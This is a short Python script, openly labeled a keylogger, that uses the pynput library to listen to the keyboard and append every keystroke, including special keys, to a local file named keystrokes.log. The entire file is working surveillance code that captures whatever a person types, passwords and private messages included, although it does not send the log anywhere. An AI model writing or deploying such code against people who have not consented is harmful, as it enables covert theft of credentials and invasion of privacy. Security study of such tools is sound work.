from pynput.keyboard import Listener

# Function to write keystrokes to a file
def on_press(key):
    with open("keystrokes.log", "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            # Special keys like 'space', 'enter', 'shift', etc.
            f.write(f"[{key}]")

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()
